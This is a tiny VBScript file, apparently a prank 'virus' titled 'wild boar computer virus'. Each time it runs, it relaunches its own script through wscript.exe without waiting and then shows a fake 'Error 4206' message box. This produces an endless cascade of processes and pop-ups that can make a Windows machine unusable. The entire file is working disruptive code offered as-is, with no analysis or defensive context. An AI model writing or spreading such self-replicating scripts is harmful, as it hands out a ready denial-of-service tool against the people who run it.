Set objShell = CreateObject("WScript.Shell")

currentScript = WScript.ScriptFullName

objShell.Run "wscript.exe """ & currentScript & """"

MsgBox "Error 4206", 16, "wild boar computer virus"
